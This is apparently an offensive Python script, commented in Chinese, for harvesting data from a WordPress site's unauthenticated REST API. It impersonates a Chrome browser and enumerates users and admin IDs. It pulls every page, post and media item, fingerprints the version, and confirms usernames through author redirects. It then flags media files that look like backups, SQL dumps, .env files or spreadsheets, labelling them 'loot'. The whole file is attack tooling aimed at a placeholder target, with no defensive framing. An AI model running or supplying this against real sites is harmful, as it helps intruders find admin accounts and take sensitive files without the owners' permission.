#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# WordPress REST API 未授权信息收割（无需任何凭据）
# 覆盖：用户枚举、全量 pages/media/posts/categories/tags、全站内容检索、版本指纹。

import json, time, re
from curl_cffi import requests

BASE = "https://TARGET"     # 改成目标
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
S = requests.Session(impersonate="chrome")

for ep in [
    "/wp-json/",                                              # 完整路由表 + namespaces（看有无自研命名空间）
    "/wp-json/wp/v2/users?per_page=100",                      # 用户枚举（含 id/slug，id=1 通常是超管）
    "/wp-json/wp/v2/pages?per_page=100",                      # 全部页面（内容库主体）
    "/wp-json/wp/v2/media?per_page=100",                      # 全部媒体（含上传文件全路径，找 xls/csv/zip/sql）
    "/wp-json/wp/v2/posts?per_page=100",
    "/wp-json/wp/v2/categories?per_page=100",
    "/wp-json/wp/v2/tags?per_page=100",
    "/wp-json/wp/v2/search?per_page=100&search=a",            # 全站内容检索（换关键词可反查配置页/密钥页）
    "/readme.html",                                           # WP 精确版本（未删则泄露）
]:
    r = S.get(BASE + ep, timeout=30, headers={"User-Agent": UA})
    print("[%s] %s  %d bytes" % (r.status_code, ep, len(r.content)))
    if "users" in ep or "media" in ep:
        print("   ", r.text[:400])
    time.sleep(1.4)

# 交叉验证用户真实存在（REST 之外的第二路，防误报）
# GET /?author=1 → 301 → /author/<username>/
for i in range(1, 13):
    r = S.get(BASE + "/?author=%d" % i, timeout=20, allow_redirects=False, headers={"User-Agent": UA})
    if r.status_code == 301:
        print("  author=%d -> %s" % (i, r.headers.get("location")))
    time.sleep(1.0)

# media 里挑非图片的业务文件（备份包 / 表格 / 配置）
m = json.loads(S.get(BASE + "/wp-json/wp/v2/media?per_page=100", timeout=30,
                     headers={"User-Agent": UA}).text)
for x in m:
    u = x.get("source_url", "")
    if re.search(r"\.(zip|sql|bak|env|log|txt|json|xml|xls|xlsx|csv|ods|doc|docx|pdf)$", u, re.I):
        print("[LOOT]", u)
